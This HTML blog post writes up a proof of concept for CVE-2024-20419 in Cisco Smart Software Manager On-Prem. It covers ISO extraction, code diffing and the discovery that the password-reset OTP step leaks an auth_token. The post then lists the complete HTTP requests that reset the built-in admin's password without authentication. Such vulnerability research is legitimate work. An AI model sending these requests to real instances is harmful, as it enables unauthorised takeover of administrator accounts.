<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>CVE-2024-20419 POC - 0xpages</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="The writeup for finding a POC for CVE-2024-20419, a CVSSv3 10.0 vulnerability in Cisco Smart Software Manager On-Prem." />
	<meta property="og:image" content=""/>
	<meta property="og:url" content="http://localhost:1313/posts/cve-2024-20419/">
  <meta property="og:site_name" content="0xpages">
  <meta property="og:title" content="CVE-2024-20419 POC">
  <meta property="og:description" content="The writeup for finding a POC for CVE-2024-20419, a CVSSv3 10.0 vulnerability in Cisco Smart Software Manager On-Prem.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-07-23T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-07-23T00:00:00+00:00">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE-2024-20419 POC">
  <meta name="twitter:description" content="The writeup for finding a POC for CVE-2024-20419, a CVSSv3 10.0 vulnerability in Cisco Smart Software Manager On-Prem.">
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css" />

	
	

	
	
	
	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">0xpages</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">CVE-2024-20419 POC</h1>
			<div class="meta">Posted on Jul 23, 2024</div>
		</div>
		
		<div class="tldr">
			<strong>tl;dr:</strong>
			The password reset workflow has the following steps: the user requests to change their password, an OTP code is generated and sent to their email address. If they validate their code, they will receive an `auth_token` which can be used to reset the password. However, in versions before 8-202212 the `auth_token` gets leaked when generating the OTP code.
		</div>

		<section class="body">
			<h2 id="finding-about-the-cve-and-starting-to-binwalk">Finding about the CVE and starting to <code>binwalk</code></h2>
<p>I found about this CVE on 23 July, while scrolling on my phone.
<a href="https://dnsc.ro/citeste/alerta-vulnerabilitati-critice-de-securitate-cibernetic-identificate-la-nivelul-unor-produse-cisco">DNSC</a> published an aricle about two critical vulnerabilities in CISCO.
CVE-2024-20419 stood out to me as it had a 10.0 CVSS score, and yet I found out about it almost a week after it was published.
Also, at a quick search I couldn&rsquo;t find any public POC for it.</p>
<p>Judging by the fact that it was marked as easy to exploit, I thought maybe I give it a try to find a POC myself. How hard could it be, right?</p>
<p>I went to the vendors official page to download the first fixed version (8-202212) and the last vulnerable one (8-202206).
The vendor provides an <code>iso</code> and the steps to deploy it, however, running two virtual machines in parallel with my aready running Kali machine might have been too much for my laptop.
That&rsquo;s why I decided for beginning to perform some static analysis.</p>
<p>Now, it was time for some <code>binwalk</code>ing to find any source code/binaries in the provided <code>iso</code>.</p>
<p>Looking through the files extracted, I found a <code>squashfs</code> file system.
Right away mounted it, but to my surprise it was just a standard CENTOS file system.</p>
<p>The last directory I looked into was <code>iso-root/hardening/</code> as the <code>hardening</code> name didn&rsquo;t suggest to me the possiblity of having any files of interest for my goal.</p>
<p>First, let me share a quick fact about Smart Software Manager On-Prem, it used to be called Smart Software Manager Satellite.</p>
<p>In the <code>hardening</code> directory I found the following interesting archive: <code>satellite-install.tgz</code> (now, you can guess why this archive seemed interesting).
After extracting its contents I had the following files:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>‚ùØ ls
</span></span><span style="display:flex;"><span>ares                                        db                                          ipv6nat                                     satellite-install.sh                        typhaon
</span></span><span style="display:flex;"><span>backend                                     docker-compose.yml                          onprem-console                              services.img
</span></span><span style="display:flex;"><span>build.txt                                   fluentd                                     pw.env                                      ssl
</span></span><span style="display:flex;"><span>cerberus-8_202112-20220720212433.x86_64.rpm frontend                                    redis                                       tacacs-client
</span></span></code></pre></div><p>The contents of <code>satellite-install.sh</code> are:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Generate password env file</span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt; EOP &gt; /home/deployer/atlantis/pw.env
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SECRET_KEY_BASE=$(tr -dc A-Za-z0-9_ &lt; /dev/urandom | head -c 128)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">POSTGRES_PASSWORD=$(tr -dc A-Za-z0-9_ &lt; /dev/urandom | head -c 16)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ATLANTIS_DATABASE_PASSWORD=$(tr -dc A-Za-z0-9_ &lt; /dev/urandom | head -c 16)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">PDB_PASSWORD=$(tr -dc A-Za-z0-9_ &lt; /dev/urandom | head -c 16)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOP</span>
</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">400</span> /home/deployer/atlantis/pw.env
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Install Cerberus</span>
</span></span><span style="display:flex;"><span>rpm -Uvh ./cerberus-*.rpm
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Install OnPrem Console</span>
</span></span><span style="display:flex;"><span>cp -a ./onprem-console /opt
</span></span><span style="display:flex;"><span>chown root:root -R /opt/onprem-console
</span></span><span style="display:flex;"><span>restorecon -R /opt/onprem-console
</span></span><span style="display:flex;"><span>ln -nsf /opt/onprem-console/bin/onprem-console /usr/local/bin/onprem-console
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#SAV-10749 support database backup for nonsudousers</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;%onprem         ALL = NOPASSWD: /opt/onprem-console/scripts/backup_database.sh&#34;</span>&gt; /etc/sudoers.d/onprem
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Make runtime environment aware of build target environment</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;TARGET_ENV=prod&#34;</span> &gt;&gt; /etc/environment
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Placeholder docker context directory to satisfy docker-compose up</span>
</span></span><span style="display:flex;"><span>mkdir /home/deployer/atlantis/<span style="color:#f92672">{</span>db,backend,frontend,ipv6nat,redis,typhaon,ares,fluentd,tacacs-client<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load docker images</span>
</span></span><span style="display:flex;"><span>docker load --input ./services.img
</span></span></code></pre></div><p>I generated the <code>pw.env</code> file, loaded the docker images from <code>services.img</code> and with some tweaks to the <code>docker-compose</code> file, I could actually deploy the images on my macintosh machine.</p>
<p>First, I interacted with the login page to see its flow.
I couldn&rsquo;t reset the password of the <code>admin</code> user as it didn&rsquo;t have no email associated with it, yet I still learned something out of this: some of the paths involved in the reset password mechanism.</p>
<p>Out of all the containers running after deploying <code>backend</code> and <code>gobackend</code> seemed that they could store the source code/binaries behind this.
Some <code>grep</code>s later, I found that the source code for the app lives in the <code>backend</code> docker image and its written in Ruby.</p>
<p>I extracted the code to my local machine and then repeated the process for the patched version.</p>
<h2 id="diffing-the-code">Diffing the code</h2>
<p>I quickly diffed the two versions of the code to find any interesting differences.</p>
<p>The first relevant difference I found was in the User model class.
Here, a new function was defined, that decided if a user can actually reset their password or not.</p>
<p><img src="/posts/imgs/can_reset.png" alt="can reset function"></p>
<p>The second difference, was in the <code>reset_password_service.rb</code>.</p>
<p><img src="/posts/imgs/reset1.png" alt="reset service">
<img src="/posts/imgs/reset2.png" alt="reset service"></p>
<p>The changes from the reset password service were quite subtle, and I still couldn&rsquo;t put the finger on what was the change that fixed this vulnerability.</p>
<h2 id="the-answer-was-right-in-front-of-our-face">The answer was right in front of our face</h2>
<p>I decided to interact a little with the two instances.
After going through the password reset flow from the beginning to the end, the changes was clear, and I realised that it was right in front of my face.</p>
<p>The <code>auth_token</code> is all that is needed to succesfully reset the password of a user.
This token gets leaked when we generate a OTP code via the <code>get_authtoken</code> function.</p>
<p>Also, because the lack of a check wether a user can or can&rsquo;t reset its password in the user model, we can bypass the error message I encountered earlier by simply making the <code>/backend</code> requests.
We know that all instances of CISCO SSM should have an <code>admin</code> user, which makes this even more dangerous and easier to exploit.</p>
<p>Putting these things together, we can generate a probable POC to exploit this vulnerability.</p>
<h2 id="validating-the-poc">Validating the POC</h2>
<p>First, we have to get the <code>XSRF-TOKEN</code> and <code>lic_engine_session</code> cookie.
At first, I tried the POC without these and I got hit by an error.
However, looking through the Burp Proxy HTTP History I saw that before making the request to generate an OTP code, a request to <code>/backend/settings/oauth_adfs?hostname=localhost</code> is made.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>GET /backend/settings/oauth_adfs?hostname=localhost HTTP/1.1
</span></span><span style="display:flex;"><span>Host: localhost:8443
</span></span><span style="display:flex;"><span>Sec-Ch-Ua: &#34;Not/A)Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;126&#34;
</span></span><span style="display:flex;"><span>Accept: application/json
</span></span><span style="display:flex;"><span>Content-Type: application/json
</span></span><span style="display:flex;"><span>Accept-Language: en-GB
</span></span><span style="display:flex;"><span>Sec-Ch-Ua-Mobile: ?0
</span></span><span style="display:flex;"><span>Sec-Ch-Ua-Platform: &#34;macOS&#34;
</span></span><span style="display:flex;"><span>Sec-Fetch-Site: same-origin
</span></span><span style="display:flex;"><span>Sec-Fetch-Mode: cors
</span></span><span style="display:flex;"><span>Sec-Fetch-Dest: empty
</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
</span></span><span style="display:flex;"><span>Priority: u=1, i
</span></span><span style="display:flex;"><span>Connection: keep-alive
</span></span></code></pre></div><p>The response should contain the following headers:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Set-Cookie: XSRF-TOKEN=Yr6InPJwESPfYoR52a%2Bxk4ysZOywkHzW8YlhBtSACD9HnhZ4atrqFMrjsROMbtUKpwLPKmqokmVrWiQlMOCX%2FQ%3D%3D; path=/
</span></span><span style="display:flex;"><span>Set-Cookie: _lic_engine_session=48787c9a7e0f5685e77f3203c208b777; path=/; HttpOnly
</span></span></code></pre></div><p>Then, we make a request using the <code>XSRF-TOKEN</code> and <code>lic_engine_session</code> that we extracted earlier to the <code>/backend/reset_password/generate_code</code> endpoint, to get the <code>auth_token</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>POST /backend/reset_password/generate_code HTTP/1.1
</span></span><span style="display:flex;"><span>Host: localhost:8443
</span></span><span style="display:flex;"><span>Cookie: XSRF-TOKEN=&lt;XSRF_TOKEN&gt;; _lic_engine_session=&lt;LIC_TOKEN&gt;
</span></span><span style="display:flex;"><span>Content-Length: 15
</span></span><span style="display:flex;"><span>X-Xsrf-Token: &lt;XSRF_TOKEN&gt;;
</span></span><span style="display:flex;"><span>Sec-Ch-Ua-Mobile: ?0
</span></span><span style="display:flex;"><span>Content-Type: application/json
</span></span><span style="display:flex;"><span>Accept: application/json
</span></span><span style="display:flex;"><span>Connection: keep-alive
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{&#34;uid&#34;:&#34;admin&#34;}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>HTTP/1.1 200 OK
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{&#34;uid&#34;:&#34;admin&#34;,&#34;auth_token&#34;:&#34;&lt;AUTH_TOKEN&gt;&#34;}
</span></span></code></pre></div><p>Now, with the <code>auth_token</code> we got we can make the reset password request:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>POST /backend/reset_password HTTP/1.1
</span></span><span style="display:flex;"><span>Host: localhost:8443
</span></span><span style="display:flex;"><span>User-Agent: python-requests/2.31.0
</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
</span></span><span style="display:flex;"><span>Accept: application/json
</span></span><span style="display:flex;"><span>Connection: keep-alive
</span></span><span style="display:flex;"><span>Content-Type: application/json
</span></span><span style="display:flex;"><span>X-Xsrf-Token: &lt;XSRF_TOKEN&gt;
</span></span><span style="display:flex;"><span>Cookie: _lic_engine_session=&lt;LIC_TOKEN&gt;; XSRF-TOKEN=&lt;XSRF_TOKEN&gt;
</span></span><span style="display:flex;"><span>Content-Length: 192
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{&#34;uid&#34;: &#34;admin&#34;, &#34;auth_token&#34;: &#34;AUTH_TOKEN&#34;, &#34;password&#34;: &#34;Test1234567890!&#34;, &#34;password_confirmation&#34;: &#34;Test1234567890!&#34;, &#34;common_name&#34;: &#34;&#34;}
</span></span></code></pre></div><p>If everything is alright we should get the following response:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>HTTP/1.1 200 OK
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>{&#34;status&#34;:&#34;OK&#34;}
</span></span></code></pre></div><p>Make sure to patch your instances if you have any, as this is a trivial exploit with tremendous consequences.</p>

		</section>

		<div class="post-tags">
			
			
			
		</div>
		</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/davidxbors" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a><a class="soc" href="https://twitter.com/visitorish/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2024  ¬© davidxbors |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
